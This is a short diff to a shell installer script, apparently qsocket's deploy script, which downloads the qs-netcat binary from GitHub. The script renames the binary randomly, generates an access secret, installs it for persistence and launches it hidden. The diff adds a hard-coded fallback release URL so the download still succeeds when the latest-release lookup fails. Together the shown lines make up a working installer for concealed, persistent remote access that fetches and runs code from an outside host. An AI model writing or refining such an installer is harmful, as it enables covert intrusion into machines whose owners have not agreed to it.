@@ -211,7 +211,7 @@ get_latest_release_url() {
 download_util() {
 	local ACCEPT_HEADER="Accept: application/octet-stream"
 	DOWNLOAD_URL=$(get_latest_release_url)
-	[[ -z $DOWNLOAD_URL ]] && print_fatal "Failed fetching latest release URL"
+	[[ -z $DOWNLOAD_URL ]] && DOWNLOAD_URL="${GITHUB_RELEASE_URL}/${FALLBACK_RELEASE}/${BIN_NAME}" # Switch to a static fallback release
 	print_verbose "Downloading: $DOWNLOAD_URL -> $1"
 	WGET_BIN=$(command -v wget)
 	CURL_BIN=$(command -v curl)
@@ -415,6 +415,8 @@ init_problematic_vars
 OS_ARCH=$(detect_arch)
 OS_NAME=$(detect_os)
 BASE_URL="https://api.github.com/repos/qsocket"
+GITHUB_RELEASE_URL="https://github.com/qsocket/qs-netcat/releases/download"
+FALLBACK_RELEASE="v0.0.2-beta"
 QS_DIR=$(create_qs_dir)
 RAND_NAME="`LC_ALL=C tr -dc A-Za-z0-9 </dev/urandom | head -c 8`"
 BIN_NAME="qs-netcat"
@@ -440,7 +442,7 @@ unpack_util "$QS_DIR/qs.tar.gz" "$QS_DIR/$RAND_NAME" && print_ok || (print_fail 
 print_verbose "QSocket dir: $QS_PATH"
 print_progress "Testing qsocket binaries"
 [[ $($QS_PATH -h &>$ERR_LOG) -eq 0 ]] && print_ok || (print_fail && print_fatal "Binary test failed! Exiting...")
-[[ -z "$S" ]] && S=$($QS_PATH -g) # Set secret if not given...
+[[ -z "$S" ]] && S=$($QS_PATH -g 2>&1) # Set secret if not given...
 install ||  print_error "Permanent install methods failed! Access will be lost after reboot."
 print_progress "Triggering initial execution"
 exec_hidden && print_ok || (print_fail && print_error "Initial execution failed! Try starting qsocket manually.")
